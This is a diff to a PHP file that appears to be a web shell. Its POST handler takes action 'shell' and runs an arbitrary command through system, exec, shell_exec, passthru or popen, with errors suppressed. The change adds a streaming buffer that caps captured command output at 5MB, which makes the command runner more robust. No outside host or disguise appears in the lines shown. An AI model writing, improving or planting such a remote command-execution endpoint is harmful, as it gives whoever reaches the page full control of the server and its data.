@@ -40,11 +40,29 @@ if (isset($_POST['action']) && $_POST['action'] === 'shell') {
     $output = '';
     $truncated = false;
 
+    // Bounded capture buffer: chunks past the 5MB cap are discarded as they
+    // stream instead of buffering unboundedly (a command printing hundreds
+    // of MB must not exhaust memory before the post-hoc truncation check).
+    $boundedCapture = function () use (&$output, $maxOutput, &$truncated) {
+        return function ($chunk) use (&$output, $maxOutput, &$truncated) {
+            if (strlen($output) < $maxOutput) {
+                $output .= $chunk;
+                if (strlen($output) > $maxOutput) {
+                    $output = substr($output, 0, $maxOutput);
+                    $truncated = true;
+                }
+            } else {
+                $truncated = true;
+            }
+            return '';
+        };
+    };
+
     switch ($method) {
         case 'system':
-            ob_start();
+            ob_start($boundedCapture());
             @system($fullCmd);
-            $output = ob_get_clean();
+            ob_end_clean();
             break;
         case 'exec':
             $lines = [];
@@ -55,9 +73,9 @@ if (isset($_POST['action']) && $_POST['action'] === 'shell') {
             $output = @shell_exec($fullCmd) ?? '';
             break;
         case 'passthru':
-            ob_start();
+            ob_start($boundedCapture());
             @passthru($fullCmd);
-            $output = ob_get_clean();
+            ob_end_clean();
             break;
         case 'popen':
             $handle = @popen($fullCmd, 'r');
